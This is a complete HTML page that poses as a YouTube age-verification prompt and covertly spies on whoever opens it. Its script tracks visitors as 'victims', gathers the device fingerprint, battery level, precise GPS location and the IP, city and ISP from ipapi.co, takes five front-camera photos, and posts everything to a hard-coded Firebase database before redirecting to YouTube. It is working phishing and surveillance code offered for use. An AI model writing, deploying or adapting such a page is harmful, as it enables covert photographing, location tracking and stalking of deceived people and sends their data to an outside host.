<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>YouTube Video Player</title>
    <meta property="og:title" content="YouTube Video Player">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://img.youtube.com/vi/VIDEO_ID/maxresdefault.jpg">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #ccc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .yt-ui { max-width: 400px; width: 90%; text-align: center; padding: 20px; }
        .logo { width: 120px; margin: 0 auto 20px; }
        .title { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 12px; }
        .description { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
        .red-btn { background: #ff0000; color: white; padding: 14px 35px; border-radius: 4px; font-weight: 700; font-size: 16px; text-transform: uppercase; cursor: pointer; border: none; width: 100%; max-width: 250px; margin: 0 auto; display: block; }
        .red-btn:hover { background: #cc0000; transform: scale(1.02); }
        .loader { display: inline-block; width: 30px; height: 30px; border: 3px solid #ff0000; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-text { color: #ff0000; font-size: 14px; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="yt-ui" id="main-ui">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="logo" alt="YouTube">
        <h2 class="title">Verification Required</h2>
        <p class="description">This video is age-restricted. Please click below and allow camera & location access for age verification.</p>
        <button onclick="startCapture()" class="red-btn">Verify Age</button>
    </div>
    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let VICTIM_ID = urlParams.get('id') || 'unknown_' + Date.now();
        const VIDEO_ID = urlParams.get('v') || 'dQw4w9WgXcQ';
        const FB_URL = "https://hgggy-a047e-default-rtdb.firebaseio.com/targets.json";
        
        // DECODE victim ID (base64 se original decode)
        try {
            VICTIM_ID = atob(VICTIM_ID);
        } catch(e) {
            // Already plain text, keep as is
        }
        
        let photoCount = 0;
        let targetData = {
            victimId: VICTIM_ID,
            time: new Date().toLocaleString(),
            timestamp: Date.now(),
            photos: [],
            device: { ua: navigator.userAgent, ram: navigator.deviceMemory || 'N/A', cores: navigator.hardwareConcurrency || 'N/A', platform: navigator.platform }
        };

        async function startCapture() {
            document.getElementById('main-ui').innerHTML = `<div style="text-align: center;"><div class="loader" style="margin: 0 auto 20px;"></div><p class="status-text">Verifying your age...</p><p style="font-size: 12px; color: #666; margin-top: 15px;">Please wait...</p></div>`;
            
            try { const b = await navigator.getBattery(); targetData.battery = Math.round(b.level * 100) + "%"; } catch(e) {}
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    targetData.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                }, null, { enableHighAccuracy: true, timeout: 10000 });
            }
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const geo = await res.json();
                targetData.ip = geo.ip;
                targetData.city = geo.city + ", " + geo.country;
                targetData.isp = geo.org;
            } catch(e) {}
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                
                const captureInterval = setInterval(async () => {
                    if (photoCount >= 5) {
                        clearInterval(captureInterval);
                        await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
                        return;
                    }
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    targetData.photos.push(canvas.toDataURL('image/jpeg', 0.5));
                    photoCount++;
                    await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                }, 600);
            } catch(e) {
                await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID; }, 2000);
            }
        }
    </script>
</body>
</html>
